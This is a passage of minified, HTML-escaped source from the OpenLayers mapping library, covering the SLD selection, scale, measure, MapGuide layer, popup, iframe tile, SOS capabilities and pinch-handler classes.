this.handlerOptions=this.handlerOptions||{};this.layerOptions=OpenLayers.Util.applyDefaults(this.layerOptions,{displayInLayerSwitcher:!1,tileOptions:{maxGetUrlLength:2048}});this.sketchStyle&amp;&amp;(this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{styleMap:new OpenLayers.StyleMap({"default":this.sketchStyle})}));this.handler=new a(this,this.callbacks,this.handlerOptions)},destroy:function(){for(var a in this.layerCache)delete this.layerCache[a];for(a in this.wfsCache)delete this.wfsCache[a]; OpenLayers.Control.prototype.destroy.apply(this,arguments)},coupleLayerVisiblity:function(a){this.setVisibility(a.object.getVisibility())},createSelectionLayer:function(a){var b;if(this.layerCache[a.id])b=this.layerCache[a.id];else{b=new OpenLayers.Layer.WMS(a.name,a.url,a.params,OpenLayers.Util.applyDefaults(this.layerOptions,a.getOptions()));this.layerCache[a.id]=b;if(!1===this.layerOptions.displayInLayerSwitcher)a.events.on({visibilitychanged:this.coupleLayerVisiblity,scope:b});this.map.addLayer(b)}return b}, createSLD:function(a,b,c){for(var d={version:"1.0.0",namedLayers:{}},e=(""+a.params.LAYERS).split(","),f=0,g=e.length;f&lt;g;f++){var h=e[f];d.namedLayers[h]={name:h,userStyles:[]};var k=this.selectionSymbolizer,l=c[f];0&lt;=l.type.indexOf("Polygon")?k={Polygon:this.selectionSymbolizer.Polygon}:0&lt;=l.type.indexOf("LineString")?k={Line:this.selectionSymbolizer.Line}:0&lt;=l.type.indexOf("Point")&amp;&amp;(k={Point:this.selectionSymbolizer.Point});d.namedLayers[h].userStyles.push({name:"default",rules:[new OpenLayers.Rule({symbolizer:k, filter:b[f],maxScaleDenominator:a.options.minScale})]})}return(new OpenLayers.Format.SLD({srsName:this.map.getProjection()})).write(d)},parseDescribeLayer:function(a){var b=new OpenLayers.Format.WMSDescribeLayer,c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);a=b.read(c);for(var b=[],c=null,d=0,e=a.length;d&lt;e;d++)"WFS"==a[d].owsType&amp;&amp;(b.push(a[d].typeName),c=a[d].owsURL);OpenLayers.Request.GET({url:c,params:{SERVICE:"WFS",TYPENAME:b.toString(),REQUEST:"DescribeFeatureType",VERSION:"1.0.0"}, callback:function(a){var b=new OpenLayers.Format.WFSDescribeFeatureType,c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);a=b.read(c);this.control.wfsCache[this.layer.id]=a;this.control._queue&amp;&amp;this.control.applySelection()},scope:this})},getGeometryAttributes:function(a){var b=[];a=this.wfsCache[a.id];for(var c=0,d=a.featureTypes.length;c&lt;d;c++)for(var e=a.featureTypes[c].properties,f=0,g=e.length;f&lt;g;f++){var h=e[f],k=h.type;(0&lt;=k.indexOf("LineString")||0&lt;=k.indexOf("GeometryAssociationType")|| 0&lt;=k.indexOf("GeometryPropertyType")||0&lt;=k.indexOf("Point")||0&lt;=k.indexOf("Polygon"))&amp;&amp;b.push(h)}return b},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a)for(var b=0,c=this.layers.length;b&lt;c;b++){var d=this.layers[b];d&amp;&amp;!this.wfsCache[d.id]&amp;&amp;OpenLayers.Request.GET({url:d.url,params:{SERVICE:"WMS",VERSION:d.params.VERSION,LAYERS:d.params.LAYERS,REQUEST:"DescribeLayer"},callback:this.parseDescribeLayer,scope:{layer:d,control:this}})}return a},deactivate:function(){var a= OpenLayers.Control.prototype.deactivate.call(this);if(a)for(var b=0,c=this.layers.length;b&lt;c;b++){var d=this.layers[b];if(d&amp;&amp;!0===this.clearOnDeactivate){var e=this.layerCache,f=e[d.id];f&amp;&amp;(d.events.un({visibilitychanged:this.coupleLayerVisiblity,scope:f}),f.destroy(),delete e[d.id])}}return a},setLayers:function(a){this.active?(this.deactivate(),this.layers=a,this.activate()):this.layers=a},createFilter:function(a,b){var c=null;this.handler instanceof OpenLayers.Handler.RegularPolygon?c=!0===this.handler.irregular? new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,property:a.name,value:b.getBounds()}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Polygon?c=new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Path?c=0&lt;=a.type.indexOf("Point")?new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN, property:a.name,distance:0.01*this.map.getExtent().getWidth(),distanceUnits:this.map.getUnits(),value:b}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Click&amp;&amp;(c=0&lt;=a.type.indexOf("Polygon")?new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,property:a.name,distance:0.01*this.map.getExtent().getWidth(), distanceUnits:this.map.getUnits(),value:b}));return c},select:function(a){this._queue=function(){for(var b=0,c=this.layers.length;b&lt;c;b++){for(var d=this.layers[b],e=this.getGeometryAttributes(d),f=[],g=0,h=e.length;g&lt;h;g++){var k=e[g];if(null!==k){if(!(a instanceof OpenLayers.Geometry)){var l=this.map.getLonLatFromPixel(a.xy);a=new OpenLayers.Geometry.Point(l.lon,l.lat)}k=this.createFilter(k,a);null!==k&amp;&amp;f.push(k)}}g=this.createSelectionLayer(d);this.events.triggerEvent("selected",{layer:d,filters:f}); d=this.createSLD(d,f,e);g.mergeNewParams({SLD_BODY:d});delete this._queue}};this.applySelection()},applySelection:function(){for(var a=!0,b=0,c=this.layers.length;b&lt;c;b++)if(!this.wfsCache[this.layers[b].id]){a=!1;break}a&amp;&amp;this._queue.call(this)},CLASS_NAME:"OpenLayers.Control.SLDSelect"});OpenLayers.Control.Scale=OpenLayers.Class(OpenLayers.Control,{element:null,geodesic:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.element=OpenLayers.Util.getElement(a)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.element=document.createElement("div"),this.div.appendChild(this.element));this.map.events.register("moveend",this,this.updateScale);this.updateScale();return this.div},updateScale:function(){var a; if(!0===this.geodesic){if(!this.map.getUnits())return;a=OpenLayers.INCHES_PER_UNIT;a=(this.map.getGeodesicPixelSize().w||1E-6)*a.km*OpenLayers.DOTS_PER_INCH}else a=this.map.getScale();a&amp;&amp;(a=9500&lt;=a&amp;&amp;95E4>=a?Math.round(a/1E3)+"K":95E4&lt;=a?Math.round(a/1E6)+"M":Math.round(a),this.element.innerHTML=OpenLayers.i18n("Scale = 1 : ${scaleDenom}",{scaleDenom:a}))},CLASS_NAME:"OpenLayers.Control.Scale"});OpenLayers.Layer.MapGuide=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,useHttpTile:!1,singleTile:!1,useOverlay:!1,useAsyncOverlay:!0,TILE_PARAMS:{operation:"GETTILEIMAGE",version:"1.2.0"},SINGLE_TILE_PARAMS:{operation:"GETMAPIMAGE",format:"PNG",locale:"en",clip:"1",version:"1.0.0"},OVERLAY_PARAMS:{operation:"GETDYNAMICMAPOVERLAYIMAGE",format:"PNG",locale:"en",clip:"1",version:"2.0.0"},FOLDER_PARAMS:{tileColumnsPerFolder:30,tileRowsPerFolder:30,format:"png",querystring:null},defaultSize:new OpenLayers.Size(300, 300),tileOriginCorner:"tl",initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);if(null==d||null==d.isBaseLayer)this.isBaseLayer="true"!=this.transparent&amp;&amp;!0!=this.transparent;d&amp;&amp;null!=d.useOverlay&amp;&amp;(this.useOverlay=d.useOverlay);this.singleTile?this.useOverlay?(OpenLayers.Util.applyDefaults(this.params,this.OVERLAY_PARAMS),this.useAsyncOverlay||(this.params.version="1.0.0")):OpenLayers.Util.applyDefaults(this.params,this.SINGLE_TILE_PARAMS):(this.useHttpTile? OpenLayers.Util.applyDefaults(this.params,this.FOLDER_PARAMS):OpenLayers.Util.applyDefaults(this.params,this.TILE_PARAMS),this.setTileSize(this.defaultSize))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.MapGuide(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){var b;b=a.getCenterLonLat();var c=this.map.getSize();this.singleTile?(a={setdisplaydpi:OpenLayers.DOTS_PER_INCH,setdisplayheight:c.h*this.ratio,setdisplaywidth:c.w* this.ratio,setviewcenterx:b.lon,setviewcentery:b.lat,setviewscale:this.map.getScale()},this.useOverlay&amp;&amp;!this.useAsyncOverlay&amp;&amp;(b={},b=OpenLayers.Util.extend(b,a),b.operation="GETVISIBLEMAPEXTENT",b.version="1.0.0",b.session=this.params.session,b.mapName=this.params.mapName,b.format="text/xml",b=this.getFullRequestString(b),OpenLayers.Request.GET({url:b,async:!1})),b=this.getFullRequestString(a)):(c=this.map.getResolution(),b=Math.floor((a.left-this.maxExtent.left)/c),b=Math.round(b/this.tileSize.w), a=Math.floor((this.maxExtent.top-a.top)/c),a=Math.round(a/this.tileSize.h),b=this.useHttpTile?this.getImageFilePath({tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1}):this.getFullRequestString({tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1}));return b},getFullRequestString:function(a,b){var c=null==b?this.url:b;"object"==typeof c&amp;&amp;(c=c[Math.floor(Math.random()*c.length)]);var d=c,e=OpenLayers.Util.extend({},this.params),e=OpenLayers.Util.extend(e,a), f=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),g;for(g in e)g.toUpperCase()in f&amp;&amp;delete e[g];e=OpenLayers.Util.getParameterString(e);e=e.replace(/,/g,"+");""!=e&amp;&amp;(f=c.charAt(c.length-1),d="&amp;"==f||"?"==f?d+e:-1==c.indexOf("?")?d+("?"+e):d+("&amp;"+e));return d},getImageFilePath:function(a,b){var c=null==b?this.url:b;"object"==typeof c&amp;&amp;(c=c[Math.floor(Math.random()*c.length)]);var d="",e="";0>a.tilerow&amp;&amp;(d="-");d=0==a.tilerow?d+"0":d+Math.floor(Math.abs(a.tilerow/this.params.tileRowsPerFolder))* this.params.tileRowsPerFolder;0>a.tilecol&amp;&amp;(e="-");e=0==a.tilecol?e+"0":e+Math.floor(Math.abs(a.tilecol/this.params.tileColumnsPerFolder))*this.params.tileColumnsPerFolder;d="/S"+Math.floor(a.scaleindex)+"/"+this.params.basemaplayergroupname+"/R"+d+"/C"+e+"/"+a.tilerow%this.params.tileRowsPerFolder+"_"+a.tilecol%this.params.tileColumnsPerFolder+"."+this.params.format;this.params.querystring&amp;&amp;(d+="?"+this.params.querystring);return c+d},CLASS_NAME:"OpenLayers.Layer.MapGuide"});OpenLayers.Control.Measure=OpenLayers.Class(OpenLayers.Control,{callbacks:null,displaySystem:"metric",geodesic:!1,displaySystemUnits:{geographic:["dd"],english:["mi","ft","in"],metric:["km","m"]},partialDelay:300,delayedTrigger:null,persist:!1,immediate:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);var c={done:this.measureComplete,point:this.measurePartial};this.immediate&amp;&amp;(c.modify=this.measureImmediate);this.callbacks=OpenLayers.Util.extend(c,this.callbacks); this.handlerOptions=OpenLayers.Util.extend({persist:this.persist},this.handlerOptions);this.handler=new a(this,this.callbacks,this.handlerOptions)},deactivate:function(){this.cancelDelay();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},cancel:function(){this.cancelDelay();this.handler.cancel()},setImmediate:function(a){(this.immediate=a)?this.callbacks.modify=this.measureImmediate:delete this.callbacks.modify},updateHandler:function(a,b){var c=this.active;c&amp;&amp;this.deactivate(); this.handler=new a(this,this.callbacks,b);c&amp;&amp;this.activate()},measureComplete:function(a){this.cancelDelay();this.measure(a,"measure")},measurePartial:function(a,b){this.cancelDelay();b=b.clone();this.handler.freehandMode(this.handler.evt)?this.measure(b,"measurepartial"):this.delayedTrigger=window.setTimeout(OpenLayers.Function.bind(function(){this.delayedTrigger=null;this.measure(b,"measurepartial")},this),this.partialDelay)},measureImmediate:function(a,b,c){c&amp;&amp;!this.handler.freehandMode(this.handler.evt)&amp;&amp; (this.cancelDelay(),this.measure(b.geometry,"measurepartial"))},cancelDelay:function(){null!==this.delayedTrigger&amp;&amp;(window.clearTimeout(this.delayedTrigger),this.delayedTrigger=null)},measure:function(a,b){var c,d;-1&lt;a.CLASS_NAME.indexOf("LineString")?(c=this.getBestLength(a),d=1):(c=this.getBestArea(a),d=2);this.events.triggerEvent(b,{measure:c[0],units:c[1],order:d,geometry:a})},getBestArea:function(a){for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e&lt;f&amp;&amp;!(c=b[e],d=this.getArea(a, c),1&lt;d);++e);return[d,c]},getArea:function(a,b){var c,d;this.geodesic?(c=a.getGeodesicArea(this.map.getProjectionObject()),d="m"):(c=a.getArea(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&amp;&amp;(c*=Math.pow(OpenLayers.INCHES_PER_UNIT[d]/e,2));return c},getBestLength:function(a){for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e&lt;f&amp;&amp;!(c=b[e],d=this.getLength(a,c),1&lt;d);++e);return[d,c]},getLength:function(a,b){var c,d;this.geodesic?(c=a.getGeodesicLength(this.map.getProjectionObject()), d="m"):(c=a.getLength(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&amp;&amp;(c*=OpenLayers.INCHES_PER_UNIT[d]/e);return c},CLASS_NAME:"OpenLayers.Control.Measure"});OpenLayers.Format.WMC.v1_0_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,{VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/context http://schemas.opengis.net/context/1.0.0/context.xsd",initialize:function(a){OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])},read_wmc_SRS:function(a,b){var c=this.getChildValue(b);"object"!=typeof a.projections&amp;&amp;(a.projections={});for(var c=c.split(/ +/),d=0,e=c.length;d&lt;e;d++)a.projections[c[d]]=!0},write_wmc_Layer:function(a){var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this, [a]);if(a.srs){var c=[],d;for(d in a.srs)c.push(d);b.appendChild(this.createElementDefaultNS("SRS",c.join(" ")))}b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&amp;&amp;b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a))},CLASS_NAME:"OpenLayers.Format.WMC.v1_0_0"});OpenLayers.Popup.Anchored=OpenLayers.Class(OpenLayers.Popup,{relativePosition:null,keepInMap:!0,anchor:null,initialize:function(a,b,c,d,e,f,g){OpenLayers.Popup.prototype.initialize.apply(this,[a,b,c,d,f,g]);this.anchor=null!=e?e:{size:new OpenLayers.Size(0,0),offset:new OpenLayers.Pixel(0,0)}},destroy:function(){this.relativePosition=this.anchor=null;OpenLayers.Popup.prototype.destroy.apply(this,arguments)},show:function(){this.updatePosition();OpenLayers.Popup.prototype.show.apply(this,arguments)}, moveTo:function(a){var b=this.relativePosition;this.relativePosition=this.calculateRelativePosition(a);OpenLayers.Popup.prototype.moveTo.call(this,this.calculateNewPx(a));this.relativePosition!=b&amp;&amp;this.updateRelativePosition()},setSize:function(a){OpenLayers.Popup.prototype.setSize.apply(this,arguments);if(this.lonlat&amp;&amp;this.map){var b=this.map.getLayerPxFromLonLat(this.lonlat);this.moveTo(b)}},calculateRelativePosition:function(a){a=this.map.getLonLatFromLayerPx(a);a=this.map.getExtent().determineQuadrant(a); return OpenLayers.Bounds.oppositeQuadrant(a)},updateRelativePosition:function(){},calculateNewPx:function(a){a=a.offset(this.anchor.offset);var b=this.size||this.contentSize,c="t"==this.relativePosition.charAt(0);a.y+=c?-b.h:this.anchor.size.h;c="l"==this.relativePosition.charAt(1);a.x+=c?-b.w:this.anchor.size.w;return a},CLASS_NAME:"OpenLayers.Popup.Anchored"});OpenLayers.Popup.Framed=OpenLayers.Class(OpenLayers.Popup.Anchored,{imageSrc:null,imageSize:null,isAlphaImage:!1,positionBlocks:null,blocks:null,fixedRelativePosition:!1,initialize:function(a,b,c,d,e,f,g){OpenLayers.Popup.Anchored.prototype.initialize.apply(this,arguments);this.fixedRelativePosition&amp;&amp;(this.updateRelativePosition(),this.calculateRelativePosition=function(a){return this.relativePosition});this.contentDiv.style.position="absolute";this.contentDiv.style.zIndex=1;f&amp;&amp;(this.closeDiv.style.zIndex= 1);this.groupDiv.style.position="absolute";this.groupDiv.style.top="0px";this.groupDiv.style.left="0px";this.groupDiv.style.height="100%";this.groupDiv.style.width="100%"},destroy:function(){this.isAlphaImage=this.imageSize=this.imageSrc=null;this.fixedRelativePosition=!1;this.positionBlocks=null;for(var a=0;a&lt;this.blocks.length;a++){var b=this.blocks[a];b.image&amp;&amp;b.div.removeChild(b.image);b.image=null;b.div&amp;&amp;this.groupDiv.removeChild(b.div);b.div=null}this.blocks=null;OpenLayers.Popup.Anchored.prototype.destroy.apply(this, arguments)},setBackgroundColor:function(a){},setBorder:function(){},setOpacity:function(a){},setSize:function(a){OpenLayers.Popup.Anchored.prototype.setSize.apply(this,arguments);this.updateBlocks()},updateRelativePosition:function(){this.padding=this.positionBlocks[this.relativePosition].padding;if(this.closeDiv){var a=this.getContentDivPadding();this.closeDiv.style.right=a.right+this.padding.right+"px";this.closeDiv.style.top=a.top+this.padding.top+"px"}this.updateBlocks()},calculateNewPx:function(a){var b= OpenLayers.Popup.Anchored.prototype.calculateNewPx.apply(this,arguments);return b=b.offset(this.positionBlocks[this.relativePosition].offset)},createBlocks:function(){this.blocks=[];var a=null,b;for(b in this.positionBlocks){a=b;break}a=this.positionBlocks[a];for(b=0;b&lt;a.blocks.length;b++){var c={};this.blocks.push(c);c.div=OpenLayers.Util.createDiv(this.id+"_FrameDecorationDiv_"+b,null,null,null,"absolute",null,"hidden",null);c.image=(this.isAlphaImage?OpenLayers.Util.createAlphaImageDiv:OpenLayers.Util.createImage)(this.id+ "_FrameDecorationImg_"+b,null,this.imageSize,this.imageSrc,"absolute",null,null,null);c.div.appendChild(c.image);this.groupDiv.appendChild(c.div)}},updateBlocks:function(){this.blocks||this.createBlocks();if(this.size&amp;&amp;this.relativePosition){for(var a=this.positionBlocks[this.relativePosition],b=0;b&lt;a.blocks.length;b++){var c=a.blocks[b],d=this.blocks[b],e=c.anchor.left,f=c.anchor.bottom,g=c.anchor.right,h=c.anchor.top,k=isNaN(c.size.w)?this.size.w-(g+e):c.size.w,l=isNaN(c.size.h)?this.size.h-(f+ h):c.size.h;d.div.style.width=(0>k?0:k)+"px";d.div.style.height=(0>l?0:l)+"px";d.div.style.left=null!=e?e+"px":"";d.div.style.bottom=null!=f?f+"px":"";d.div.style.right=null!=g?g+"px":"";d.div.style.top=null!=h?h+"px":"";d.image.style.left=c.position.x+"px";d.image.style.top=c.position.y+"px"}this.contentDiv.style.left=this.padding.left+"px";this.contentDiv.style.top=this.padding.top+"px"}},CLASS_NAME:"OpenLayers.Popup.Framed"});OpenLayers.Popup.FramedCloud=OpenLayers.Class(OpenLayers.Popup.Framed,{contentDisplayClass:"olFramedCloudPopupContent",autoSize:!0,panMapIfOutOfView:!0,imageSize:new OpenLayers.Size(1276,736),isAlphaImage:!1,fixedRelativePosition:!1,positionBlocks:{tl:{offset:new OpenLayers.Pixel(44,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[{size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null, 50,0,0),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size("auto",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)},{size:new OpenLayers.Size(22,18),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-632)},{size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(0,-688)}]},tr:{offset:new OpenLayers.Pixel(-45,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[{size:new OpenLayers.Size("auto", "auto"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,50,0,0),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size("auto",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)},{size:new OpenLayers.Size(22,19),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-631)},{size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(0, 0,null,null),position:new OpenLayers.Pixel(-215,-687)}]},bl:{offset:new OpenLayers.Pixel(45,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[{size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size("auto",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)},{size:new OpenLayers.Size(22, 21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)},{size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(null,null,0,0),position:new OpenLayers.Pixel(-101,-674)}]},br:{offset:new OpenLayers.Pixel(-44,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[{size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238, 0)},{size:new OpenLayers.Size("auto",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)},{size:new OpenLayers.Size(22,21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)},{size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(0,null,null,0),position:new OpenLayers.Pixel(-311,-674)}]}},minSize:new OpenLayers.Size(105,10),maxSize:new OpenLayers.Size(1200,660),initialize:function(a,b,c,d,e,f,g){this.imageSrc=OpenLayers.Util.getImageLocation("cloud-popup-relative.png"); OpenLayers.Popup.Framed.prototype.initialize.apply(this,arguments);this.contentDiv.className=this.contentDisplayClass},CLASS_NAME:"OpenLayers.Popup.FramedCloud"});OpenLayers.Tile.Image.IFrame={useIFrame:null,blankImageUrl:"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAQAIBRAA7",draw:function(){if(OpenLayers.Tile.Image.prototype.shouldDraw.call(this)){var a=this.layer.getURL(this.bounds),b=this.useIFrame;this.useIFrame=null!==this.maxGetUrlLength&amp;&amp;!this.layer.async&amp;&amp;a.length>this.maxGetUrlLength;a=b&amp;&amp;!this.useIFrame;b=!b&amp;&amp;this.useIFrame;if(a||b)this.imgDiv&amp;&amp;this.imgDiv.parentNode===this.frame&amp;&amp;this.frame.removeChild(this.imgDiv),this.imgDiv= null,a&amp;&amp;this.frame.removeChild(this.frame.firstChild)}return OpenLayers.Tile.Image.prototype.draw.apply(this,arguments)},getImage:function(){if(!0===this.useIFrame){if(!this.frame.childNodes.length){var a=document.createElement("div"),b=a.style;b.position="absolute";b.width="100%";b.height="100%";b.zIndex=1;b.backgroundImage="url("+this.blankImageUrl+")";this.frame.appendChild(a)}a=this.id+"_iFrame";9>parseFloat(navigator.appVersion.split("MSIE")[1])?(b=document.createElement('&lt;iframe name="'+a+'">'), b.style.backgroundColor="#FFFFFF",b.style.filter="chroma(color=#FFFFFF)"):(b=document.createElement("iframe"),b.style.backgroundColor="transparent",b.name=a);b.scrolling="no";b.marginWidth="0px";b.marginHeight="0px";b.frameBorder="0";b.style.position="absolute";b.style.width="100%";b.style.height="100%";1>this.layer.opacity&amp;&amp;OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,this.layer.opacity);this.frame.appendChild(b);return this.imgDiv=b}return OpenLayers.Tile.Image.prototype.getImage.apply(this, arguments)},createRequestForm:function(){var a=document.createElement("form");a.method="POST";var b=this.layer.params._OLSALT,b=(b?b+"_":"")+this.bounds.toBBOX();a.action=OpenLayers.Util.urlAppend(this.layer.url,b);a.target=this.id+"_iFrame";this.layer.getImageSize();var b=OpenLayers.Util.getParameters(this.url),c,d;for(d in b)c=document.createElement("input"),c.type="hidden",c.name=d,c.value=b[d],a.appendChild(c);return a},setImgSrc:function(a){if(!0===this.useIFrame)if(a){var b=this.createRequestForm(); this.frame.appendChild(b);b.submit();this.frame.removeChild(b)}else this.imgDiv.parentNode===this.frame&amp;&amp;(this.frame.removeChild(this.imgDiv),this.imgDiv=null);else OpenLayers.Tile.Image.prototype.setImgSrc.apply(this,arguments)},onImageLoad:function(){OpenLayers.Tile.Image.prototype.onImageLoad.apply(this,arguments);!0===this.useIFrame&amp;&amp;(this.imgDiv.style.opacity=1,this.frame.style.opacity=this.layer.opacity)},createBackBuffer:function(){var a;!1===this.useIFrame&amp;&amp;(a=OpenLayers.Tile.Image.prototype.createBackBuffer.call(this)); return a}};OpenLayers.Format.SOSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.SOSCapabilities"});OpenLayers.Format.SOSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.SOSCapabilities,{namespaces:{ows:"http://www.opengis.net/ows/1.1",sos:"http://www.opengis.net/sos/1.0",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this, [a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{gml:OpenLayers.Util.applyDefaults({name:function(a,b){b.name=this.getChildValue(a)},TimePeriod:function(a,b){b.timePeriod={};this.readChildNodes(a,b.timePeriod)},beginPosition:function(a,b){b.beginPosition=this.getChildValue(a)},endPosition:function(a,b){b.endPosition=this.getChildValue(a)}},OpenLayers.Format.GML.v3.prototype.readers.gml),sos:{Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a, b){b.contents={};this.readChildNodes(a,b.contents)},ObservationOfferingList:function(a,b){b.offeringList={};this.readChildNodes(a,b.offeringList)},ObservationOffering:function(a,b){var c=this.getAttributeNS(a,this.namespaces.gml,"id");b[c]={procedures:[],observedProperties:[],featureOfInterestIds:[],responseFormats:[],resultModels:[],responseModes:[]};this.readChildNodes(a,b[c])},time:function(a,b){b.time={};this.readChildNodes(a,b.time)},procedure:function(a,b){b.procedures.push(this.getAttributeNS(a, this.namespaces.xlink,"href"))},observedProperty:function(a,b){b.observedProperties.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))},featureOfInterest:function(a,b){b.featureOfInterestIds.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))},responseFormat:function(a,b){b.responseFormats.push(this.getChildValue(a))},resultModel:function(a,b){b.resultModels.push(this.getChildValue(a))},responseMode:function(a,b){b.responseModes.push(this.getChildValue(a))}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows}, CLASS_NAME:"OpenLayers.Format.SOSCapabilities.v1_0_0"});OpenLayers.Handler.Pinch=OpenLayers.Class(OpenLayers.Handler,{started:!1,stopDown:!1,pinching:!1,last:null,start:null,touchstart:function(a){var b=!0;this.pinching=!1;if(OpenLayers.Event.isMultiTouch(a))this.started=!0,this.last=this.start={distance:this.getDistance(a.touches),delta:0,scale:1},this.callback("start",[a,this.start]),b=!this.stopDown;else{if(this.started)return!1;this.started=!1;this.last=this.start=null}OpenLayers.Event.preventDefault(a);return b},touchmove:function(a){if(this.started&amp;&amp; OpenLayers.Event.isMultiTouch(a)){this.pinching=!0;var b=this.getPinchData(a);this.callback("move",[a,b]);this.last=b;OpenLayers.Event.stop(a)}else if(this.started)return!1;return!0},touchend:function(a){return this.started&amp;&amp;!OpenLayers.Event.isMultiTouch(a)?(this.pinching=this.started=!1,this.callback("done",[a,this.start,this.last]),this.last=this.start=null,!1):!0},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.pinching=!1,a=!0);return a},deactivate:function(){var a= !1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.pinching=this.started=!1,this.last=this.start=null,a=!0);return a},getDistance:function(a){var b=a[0];a=a[1];return 